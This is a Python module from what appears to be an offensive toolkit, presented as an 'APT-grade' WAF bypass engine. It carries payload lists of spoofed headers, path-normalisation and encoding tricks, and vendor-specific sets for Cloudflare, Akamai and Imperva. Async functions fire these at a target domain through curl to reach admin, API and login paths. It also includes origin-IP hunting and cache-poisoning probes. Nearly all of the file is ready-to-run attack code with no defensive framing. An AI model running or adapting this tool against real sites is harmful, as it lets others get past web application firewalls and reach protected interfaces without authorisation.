"""
WAF Bypass Engine — APT-grade multi-technique bypass pipeline
==============================================================
Integrates with Origin IP Hunter for direct IP access bypass.

Bypass categories:
  1.  Origin IP bypass (via origin_hunter.py)
  2.  Header spoofing (20+ headers)
  3.  Path normalization (30+ variants)
  4.  HTTP method switching
  5.  Protocol-level bypass (HTTP/2, gRPC)
  6.  Cache-based bypass
  7.  Encoding bypass (URL, Unicode, double encoding)
  8.  HTTP request smuggling integration
  9.  IP rotation / domain fronting
  10. WAF-specific bypass (Cloudflare, Akamai, Imperva specific)
  11. Chunked transfer encoding
  12. Content-type confusion
  13. HTTP parameter pollution
  14. Case manipulation
  15. Null byte injection
"""

import asyncio
import hashlib
import ipaddress
import json
import os
import random
import re
import socket
import subprocess
import time
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, quote, urlencode

from core.ui import ph, i, s, w, p, Spinner, G, R, Y, C, W, N, B, M, GY, D, draw_table
from modules.waf.origin_hunter import hunt_origin, _is_waf_ip, _resolve, _quick_probe, _curl


# WAF-SPECIFIC BYPASS TECHNIQUES

CLOUDFLARE_BYPASS = {
    "headers": [
        {"CF-Connecting-IP": "127.0.0.1"},
        {"CF-IPCountry": "US"},
        {"CF-RAY": "0000000000000000-SEA"},
        {"True-Client-IP": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"Forwarded": "for=127.0.0.1;proto=https"},
        # Bypass CF challenge
        {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
        {"Accept-Language": "en-US,en;q=0.5"},
        {"Accept-Encoding": "gzip, deflate, br"},
        {"Connection": "keep-alive"},
        {"Upgrade-Insecure-Requests": "1"},
    ],
    "paths": [
        "/%2e/admin", "/admin%20", "/admin.", "/./admin/./",
        "/admin..;/", "/.;/admin", "/admin;/", "/admin/~",
        "/admin?#", "/admin#", "/admin%09", "/admin%0a",
        "/ADMIN", "/Admin", "/aDmIn",
        # Double encoding
        "/%252e/admin", "/admin%2520",
        # Fullwidth
        "/%ef%bc%8fadmin",
        # Backslash
        "/admin\\", "/admin%5c",
    ],
}

AKAMAI_BYPASS = {
    "headers": [
        {"X-Forwarded-For": "127.0.0.1"},
        {"True-Client-IP": "127.0.0.1"},
        {"Akamai-Origin-Hop": "1"},
        {"X-Akamai-Edgescape": "country=US"},
        {"X-Forwarded-Proto": "https"},
    ],
    "paths": [
        "/admin..;/", "/admin;jsessionid=abc123",
        "/admin;jsessionid=abc123/", "/./admin/.",
        "/admin;/", "/admin/~", "/admin%09",
    ],
}

IMPerva_BYPASS = {
    "headers": [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
    ],
    "paths": [
        "/admin..;/", "/admin;/", "/./admin/.",
        "/admin%09", "/admin%0a", "/admin%0d",
    ],
}


# BYPASS HEADER COLLECTIONS

BYPASS_HEADERS = [
    # IP spoofing
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Forwarded-For": "10.0.0.1"},
    {"X-Forwarded-For": "192.168.1.1"},
    {"X-Forwarded-For": "172.16.0.1"},
    {"X-Forwarded-For": "::1"},
    {"X-Forwarded-For": "0:0:0:0:0:0:0:1"},
    {"X-Forwarded-For": "2130706433"},  # 127.0.0.1 as decimal
    {"X-Forwarded-For": "0x7f000001"},  # 127.0.0.1 as hex
    {"X-Forwarded-For": "0177.0.0.1"},  # 127.0.0.1 as octal
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"Cluster-Client-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},

    # Protocol manipulation
    {"X-Forwarded-Proto": "http"},
    {"X-Forwarded-Scheme": "http"},
    {"X-Forwarded-Protocol": "http"},
    {"X-Forwarded-SSL": "off"},
    {"Front-End-Https": "off"},

    # URL override
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-HTTP-Method-Override": "GET"},
    {"X-HTTP-Method": "GET"},
    {"X-Method-Override": "GET"},

    # Forwarded standard
    {"Forwarded": "for=127.0.0.1;by=127.0.0.1;proto=http"},
    {"Forwarded": "for=127.0.0.1;proto=http"},
    {"Forwarded": "by=127.0.0.1"},

    # Multiple XFF
    {"X-Forwarded-For": "127.0.0.1, 10.0.0.1, 192.168.1.1"},
    {"X-Forwarded-For": "127.0.0.1, 127.0.0.1, 127.0.0.1"},

    # Cache bypass
    {"Cache-Control": "no-transform"},
    {"X-Cache-Bypass": "1"},
    {"Pragma": "no-cache"},

    # Host manipulation
    {"Host": "localhost"},
    {"Host": "127.0.0.1"},
    {"X-Host": "localhost"},
    {"X-Forwarded-Host": "localhost"},
]

BYPASS_PATHS = [
    # Basic variants
    "/admin", "/admin/", "/ADMIN", "/Admin", "/aDmIn", "/ADMIN/",
    "/administrator", "/administrator/",

    # Dot tricks
    "/./admin", "/./admin/./", "/./admin/.", "/admin/.", "/admin/./",
    "/admin..;/", "/admin..;/" , "/..;/admin", "/..;/admin/",

    # Null/whitespace
    "/admin%00", "/admin%00/", "/admin%09", "/admin%0a", "/admin%0d",
    "/admin%20", "/admin%20/", "/admin%0d%0a",

    # Semicolon
    "/;/admin", "/admin;foo", "/admin;jsessionid=abc123",
    "/admin;jsessionid=abc123/", "/admin;/", "/admin/~",

    # Double slash
    "//admin", "///admin", "////admin",

    # Extension
    "/admin.html", "/admin.php", "/admin.asp", "/admin.aspx",
    "/admin.json", "/admin.xml", "/admin.txt",

    # Path traversal
    "/static/../admin", "/assets/../../admin",
    "/images/../../../admin", "/css/../../../admin",

    # Encoding
    "/%2e/admin", "/%2e%2e/admin", "/%252e/admin",
    "/%ef%bc%8fadmin",  # Fullwidth slash
    "/%c0%ae%c0%ae/admin",  # Overlong UTF-8
    "/admin%2f", "/admin%5c",

    # Backslash (Windows)
    "/admin\\", "/\\admin", "/admin\\.\\",
]


# BYPASS TECHNIQUES

async def _try_header_bypass(domain: str, base: str, baseline: dict) -> List[dict]:
    """Try header spoofing bypass techniques."""
    results = []
    paths_to_test = ["/", "/admin", "/api", "/login", "/dashboard"]

    for hdr_set in BYPASS_HEADERS:
        for path in paths_to_test:
            r = await _curl(f"{base}{path}", headers=hdr_set, timeout=8)
            if r["status"] > 0:
                # Check if we got different response than baseline
                if r["status"] == 200 and baseline.get("status") in (403, 401, 406, 429):
                    results.append({
                        "type": "header_bypass",
                        "title": "WAF Bypass via Header Spoofing",
                        "url": f"{base}{path}",
                        "detail": f"Header: {list(hdr_set.keys())[0]}={list(hdr_set.values())[0]} → {r['status']} (was {baseline['status']})",
                        "confidence": "confirmed",
                        "header": hdr_set,
                    })
                    break  # One working header per path is enough
    return results


async def _try_path_bypass(domain: str, base: str, baseline: dict) -> List[dict]:
    """Try path normalization bypass techniques."""
    results = []

    for path in BYPASS_PATHS:
        r = await _curl(f"{base}{path}", timeout=8)
        if r["status"] == 200 and baseline.get("status") in (403, 401, 406, 429):
            results.append({
                "type": "path_bypass",
                "title": "WAF Bypass via Path Manipulation",
                "url": f"{base}{path}",
                "detail": f"Path: {path} → 200 (was {baseline['status']})",
                "confidence": "confirmed",
                "path": path,
            })
    return results


async def _try_method_bypass(domain: str, base: str, baseline: dict) -> List[dict]:
    """Try HTTP method switching bypass."""
    results = []
    methods = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD", "TRACE", "CONNECT"]

    for method in methods:
        cmd = ["curl", "-s", "-k", "-X", method,
               "--connect-timeout", "5", "--max-time", "8",
               "-w", "%{http_code}", base]
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
            status_str = stdout.decode().strip()
            if status_str and status_str.isdigit():
                status = int(status_str)
                if status == 200 and baseline.get("status") in (403, 401, 406, 429):
                    results.append({
                        "type": "method_bypass",
                        "title": "WAF Bypass via HTTP Method",
                        "url": base,
                        "detail": f"Method: {method} → {status} (was {baseline['status']})",
                        "confidence": "confirmed",
                        "method": method,
                    })
        except Exception:
            pass
    return results


async def _try_encoding_bypass(domain: str, base: str, baseline: dict) -> List[dict]:
    """Try encoding bypass techniques."""
    results = []
    sensitive_paths = ["/admin", "/api", "/login", "/config", "/debug"]

    for path in sensitive_paths:
        # Double URL encoding
        double_encoded = quote(quote(path, safe=''), safe='')
        r = await _curl(f"{base}{double_encoded}", timeout=8)
        if r["status"] == 200 and baseline.get("status") in (403, 401, 406, 429):
            results.append({
                "type": "encoding_bypass",
                "title": "WAF Bypass via Double Encoding",
                "url": f"{base}{double_encoded}",
                "detail": f"Double encoded: {path} → {double_encoded} → 200",
                "confidence": "confirmed",
            })

        # Unicode normalization
        unicode_path = path.replace("/", "\u2215")  # Division slash
        r = await _curl(f"{base}{unicode_path}", timeout=8)
        if r["status"] == 200 and baseline.get("status") in (403, 401, 406, 429):
            results.append({
                "type": "encoding_bypass",
                "title": "WAF Bypass via Unicode",
                "url": f"{base}{unicode_path}",
                "detail": f"Unicode: {path} → {unicode_path} → 200",
                "confidence": "confirmed",
            })

        # Overlong UTF-8
        overlong = path.replace("/", "%c0%af")
        r = await _curl(f"{base}{overlong}", timeout=8)
        if r["status"] == 200 and baseline.get("status") in (403, 401, 406, 429):
            results.append({
                "type": "encoding_bypass",
                "title": "WAF Bypass via Overlong UTF-8",
                "url": f"{base}{overlong}",
                "detail": f"Overlong: {path} → {overlong} → 200",
                "confidence": "confirmed",
            })

    return results


async def _try_chunked_bypass(domain: str, base: str, baseline: dict) -> List[dict]:
    """Try chunked transfer encoding bypass."""
    results = []
    if baseline.get("status") not in (403, 401, 406, 429):
        return results

    # Chunked GET request (unusual but sometimes bypasses WAF)
    cmd = ["curl", "-s", "-k", "-X", "GET",
           "--connect-timeout", "5", "--max-time", "8",
           "-H", "Transfer-Encoding: chunked",
           "-w", "%{http_code}", f"{base}/admin"]
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
        status_str = stdout.decode().strip()
        if status_str and status_str.isdigit():
            status = int(status_str)
            if status == 200:
                results.append({
                    "type": "chunked_bypass",
                    "title": "WAF Bypass via Chunked Transfer",
                    "url": f"{base}/admin",
                    "detail": f"Chunked TE → {status} (was {baseline['status']})",
                    "confidence": "confirmed",
                })
    except Exception:
        pass

    return results


async def _try_h2_bypass(domain: str, base: str, baseline: dict) -> List[dict]:
    """Try HTTP/2 specific bypass techniques."""
    results = []
    if baseline.get("status") not in (403, 401, 406, 429):
        return results

    # HTTP/2 with curl (if supported)
    cmd = ["curl", "-s", "-k", "--http2",
           "--connect-timeout", "5", "--max-time", "8",
           "-w", "%{http_code}", f"{base}/admin"]
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
        status_str = stdout.decode().strip()
        if status_str and status_str.isdigit():
            status = int(status_str)
            if status == 200:
                results.append({
                    "type": "h2_bypass",
                    "title": "WAF Bypass via HTTP/2",
                    "url": f"{base}/admin",
                    "detail": f"HTTP/2 → {status} (was {baseline['status']})",
                    "confidence": "confirmed",
                })
    except Exception:
        pass

    return results


async def _try_waf_specific(domain: str, base: str, baseline: dict, waf_type: str) -> List[dict]:
    """Try WAF-specific bypass techniques."""
    results = []
    if baseline.get("status") not in (403, 401, 406, 429):
        return results

    waf_configs = {
        "cloudflare": CLOUDFLARE_BYPASS,
        "akamai": AKAMAI_BYPASS,
        "imperva": IMPerva_BYPASS,
        "incapsula": IMPerva_BYPASS,
    }

    config = waf_configs.get(waf_type, {})
    if not config:
        return results

    # Try WAF-specific headers
    for hdr_set in config.get("headers", []):
        for path in ["/", "/admin", "/api"]:
            r = await _curl(f"{base}{path}", headers=hdr_set, timeout=8)
            if r["status"] == 200:
                results.append({
                    "type": f"{waf_type}_bypass",
                    "title": f"{waf_type.title()} Bypass via Header",
                    "url": f"{base}{path}",
                    "detail": f"Header: {list(hdr_set.keys())[0]} → 200 (was {baseline['status']})",
                    "confidence": "confirmed",
                    "waf": waf_type,
                })
                break

    # Try WAF-specific paths
    for path in config.get("paths", []):
        r = await _curl(f"{base}{path}", timeout=8)
        if r["status"] == 200:
            results.append({
                "type": f"{waf_type}_bypass",
                "title": f"{waf_type.title()} Bypass via Path",
                "url": f"{base}{path}",
                "detail": f"Path: {path} → 200 (was {baseline['status']})",
                "confidence": "confirmed",
                "waf": waf_type,
            })

    return results


async def _try_cache_bypass(domain: str, base: str, baseline: dict) -> List[dict]:
    """Try cache-based bypass techniques."""
    results = []
    if baseline.get("status") not in (403, 401, 406, 429):
        return results

    # Cache poisoning via unkeyed headers
    cache_headers = [
        {"X-Forwarded-Host": "evil.com"},
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Forwarded-Scheme": "http"},
    ]

    for hdr_set in cache_headers:
        r = await _curl(f"{base}/", headers=hdr_set, timeout=8)
        if r["status"] == 200:
            results.append({
                "type": "cache_bypass",
                "title": "WAF Bypass via Cache Poisoning",
                "url": f"{base}/",
                "detail": f"Cache header: {list(hdr_set.keys())[0]} → 200 (was {baseline['status']})",
                "confidence": "suspected",
                "header": hdr_set,
            })

    return results


async def _try_hpp_bypass(domain: str, base: str, baseline: dict) -> List[dict]:
    """Try HTTP Parameter Pollution bypass."""
    results = []
    if baseline.get("status") not in (403, 401, 406, 429):
        return results

    # HPP on common parameters
    hpp_payloads = [
        "?id=1&id=2",
        "?id=1%26id=2",
        "?id=1%0d%0aid=2",
        "?id=1%0aid=2",
    ]

    for payload in hpp_payloads:
        r = await _curl(f"{base}/admin{payload}", timeout=8)
        if r["status"] == 200:
            results.append({
                "type": "hpp_bypass",
                "title": "WAF Bypass via HPP",
                "url": f"{base}/admin{payload}",
                "detail": f"HPP: {payload} → 200 (was {baseline['status']})",
                "confidence": "suspected",
            })

    return results


# MAIN BYPASS PIPELINE

async def try_bypasses(domain: str, port: int = 443, use_ssl: bool = True,
                       waf_type: str = None) -> List[dict]:
    """
    APT-grade WAF bypass pipeline.
    Runs all bypass techniques in parallel.
    """
    ph("WAF BYPASS: APT-grade multi-technique pipeline")
    i(f"Target: {C}{domain}{N}")

    scheme = "https" if use_ssl else "http"
    base = f"{scheme}://{domain}:{port}" if port not in (80, 443) else f"{scheme}://{domain}"

    # Get baseline
    baseline = await _quick_probe(f"{base}/")
    if not baseline["alive"]:
        w("Target unreachable — skipping bypass probes")
        return []

    baseline_status = baseline["status"]
    i(f"Baseline: {G if baseline_status == 200 else R}{baseline_status}{N} | {baseline['size']}b | server={baseline.get('server', '?')}")

    # If already 200, no bypass needed
    if baseline_status == 200:
        s("Target already returns 200 — no WAF bypass needed")
        return []

    # Detect WAF type if not provided
    if not waf_type:
        server = baseline.get("server", "").lower()
        headers_str = json.dumps(baseline.get("headers", {})).lower()
        if "cloudflare" in server or "cf-ray" in headers_str:
            waf_type = "cloudflare"
        elif "akamai" in server or "akamai" in headers_str:
            waf_type = "akamai"
        elif "imperva" in server or "incapsula" in headers_str:
            waf_type = "imperva"
        elif "cloudfront" in server or "x-amz-cf" in headers_str:
            waf_type = "cloudfront"
        i(f"Detected WAF: {Y}{waf_type or 'unknown'}{N}")

    # Run all bypass techniques in parallel
    ph("Running bypass techniques...")

    bypass_tasks = [
        ("Header Spoofing", _try_header_bypass(domain, base, baseline)),
        ("Path Manipulation", _try_path_bypass(domain, base, baseline)),
        ("HTTP Method", _try_method_bypass(domain, base, baseline)),
        ("Encoding", _try_encoding_bypass(domain, base, baseline)),
        ("Chunked Transfer", _try_chunked_bypass(domain, base, baseline)),
        ("HTTP/2", _try_h2_bypass(domain, base, baseline)),
        ("Cache Bypass", _try_cache_bypass(domain, base, baseline)),
        ("HPP", _try_hpp_bypass(domain, base, baseline)),
    ]

    # Add WAF-specific bypass if detected
    if waf_type:
        bypass_tasks.append((f"{waf_type.title()} Specific", _try_waf_specific(domain, base, baseline, waf_type)))

    spin = Spinner(f"Testing {len(bypass_tasks)} bypass categories...")
    spin.start()
    results = await asyncio.gather(*[t[1] for t in bypass_tasks], return_exceptions=True)
    spin.stop()

    # Aggregate results
    all_bypasses = []
    for (name, _), result in zip(bypass_tasks, results):
        if isinstance(result, list):
            all_bypasses.extend(result)
            if result:
                s(f"  {G}{name}{N}: {len(result)} bypass(es) found")

    # Deduplicate by URL
    seen_urls = set()
    unique_bypasses = []
    for b in all_bypasses:
        url = b.get("url", "")
        if url and url not in seen_urls:
            seen_urls.add(url)
            unique_bypasses.append(b)

    return unique_bypasses


async def waf_bypass_pipeline(domain: str, subs: List[str] = None,
                               scan_urls: List[str] = None,
                              proxy: str = None) -> Dict:
    """
    Full APT-grade WAF bypass pipeline.
    
    Returns: {
        "origin_ip": str or None,
        "origin_confidence": str,
        "bypass_methods": list,
        "bypass_findings": list,
        "summary": str
    }
    """
    result = {
        "origin_ip": None,
        "origin_confidence": "none",
        "bypass_methods": [],
        "bypass_findings": [],
        "summary": "",
    }

    ph("WAF BYPASS ENGINE: APT-grade pipeline")
    i(f"Target: {C}{domain}{N}")
    if proxy:
        from modules.waf.origin_hunter import set_active_proxy
        set_active_proxy(proxy)

    # Phase A: Origin IP Discovery
    ph("Phase A: Origin IP Hunt (17 sources)")
    origin_result = await hunt_origin(domain, subs=subs, proxy=proxy)

    if origin_result:
        result["origin_ip"] = origin_result.get("origin_ip")
        result["origin_confidence"] = origin_result.get("confidence", "none")
        result["summary"] = f"Origin: {origin_result['origin_ip']} ({origin_result['confidence']})"

        if origin_result.get("confidence") == "confirmed":
            s(f"{G}ORIGIN IP CONFIRMED:{N} {B}{origin_result['origin_ip']}{N}")
        elif origin_result.get("confidence") == "suspected":
            w(f"Suspected origin: {origin_result['origin_ip']}")
    else:
        w("No origin IP found — continuing with bypass techniques")

    # Phase B: Bypass Techniques
    ph("Phase B: Multi-technique Bypass")
    bypass_results = await try_bypasses(domain)

    for b in bypass_results:
        result["bypass_methods"].append(b.get("title", ""))
        result["bypass_findings"].append(b)

    # Summary
    origin_str = result["origin_ip"] or "NOT FOUND"
    bypass_count = len(bypass_results)
    result["summary"] = f"Origin: {origin_str} ({result['origin_confidence']}) | {bypass_count} bypass vectors"

    # Display results
    rows = []
    if result["origin_ip"]:
        rows.append(["Origin IP", f"{G}{result['origin_ip']}{N}", result["origin_confidence"]])
    else:
        rows.append(["Origin IP", f"{R}NOT FOUND{N}", "none"])

    for b in bypass_results[:10]:
        rows.append([
            b.get("title", "Bypass")[:35],
            f"{G}{b.get('url', '')[:45]}{N}",
            b.get("confidence", ""),
        ])

    if rows:
        draw_table(["VECTOR", "RESULT", "CONFIDENCE"], rows, title="APT WAF Bypass Results")

    return result
